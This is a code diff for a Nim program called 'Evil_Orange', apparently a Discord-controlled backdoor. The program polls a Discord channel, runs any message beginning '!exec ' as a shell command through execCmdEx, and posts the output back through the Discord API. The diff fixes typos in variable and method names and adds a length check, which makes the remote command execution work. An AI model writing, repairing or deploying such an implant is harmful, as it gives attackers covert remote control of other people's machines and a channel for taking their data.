@@ -1,7 +1,7 @@
 import std/[httpclient, json, os, osproc, strutils]
 #Hi. Welcome to Evil_Orange. I hope the code will work. have a nice day and please support
-let BOTTOKEN = getEnv("DISCORD_TOKEN", "HERE_TOKEN")
-let CHANNELID = getEnv("DISCORD_CHANNEL", "HERE_CHANEL")
+let BOT_TOKEN = getEnv("DISCORD_TOKEN", "HERE_TOKEN")
+let CHANNEL_ID = getEnv("DISCORD_CHANNEL", "HERE_CHANEL")
 var lastmessageID = ""
 proc send_discord_message(client: HttpClient, content: string)=
   let url = "https://discord.com/api/v10/channels/" & CHANNEL_ID & "/messages"
@@ -11,9 +11,9 @@ proc send_discord_message(client: HttpClient, content: string)=
   })
  #yeah its discord bro
   let safe_content = if content.len > 1900: content[0..1900] & "\n.. [ehh finished]" else: content
-  let body = %*{"content": "```\n" & safeContent & "\n```"}
+  let body = %*{"content": "```\n" & safe_content & "\n```"}
   try:
-    discard client.post_content(url, $body)
+    discard client.postContent(url, $body)
   except Exception as e: 
     echo "ERROR NUMBER : 18", e.msg
 proc poll_commands() =
@@ -29,11 +29,11 @@ proc poll_commands() =
         let msg = json_response[0]
         let msgID = msg["id"].getStr()
         let content = msg["content"].getStr()
-        let author = msg["author"]["username"].getSTR()
+        let author = msg["author"]["username"].getStr()
         # tekrar gönderme sorunu çözeceğiz burda
         if msgID != lastmessageID and not content.startsWith("[+]"):
           lastmessageID = msgID
-          if content.startsWith("!exec "):
+          if content.startsWith("!exec ") and content.len >= 7:
             let command = content[6..^1]
             echo "[*] its working yehuuuu!", command
             let (output, exitCode) = execCmdEx(command)
